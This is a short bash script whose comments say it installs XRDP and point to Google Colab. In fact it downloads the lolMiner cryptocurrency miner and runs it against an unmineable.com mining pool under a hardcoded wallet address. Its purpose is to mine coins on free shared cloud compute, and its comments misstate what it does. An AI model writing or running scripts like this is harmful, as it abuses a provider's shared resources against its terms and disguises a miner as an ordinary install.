#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R lolMiner
 
wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.57/lolminer-1.57.SwitchHiveOS.tar.gz
tar xvzf lolminer-1.57.SwitchHiveOS.tar.gz
cd lolminer
./lolMiner --algo AUTOLYKOS2 --pool stratum+ssl://autolykos.unmineable.com:4444 --user ADA:DdzFFzCqrht9EZYJ27QKUjA1wb6SgSxChvDceZnX2WynAY4jUdPwoobzUncd8CuYj1Jg2sXQjLA3kxx4a3s3926amncganR9NyHJXcew.unmineable_worker_grdhyxxo 
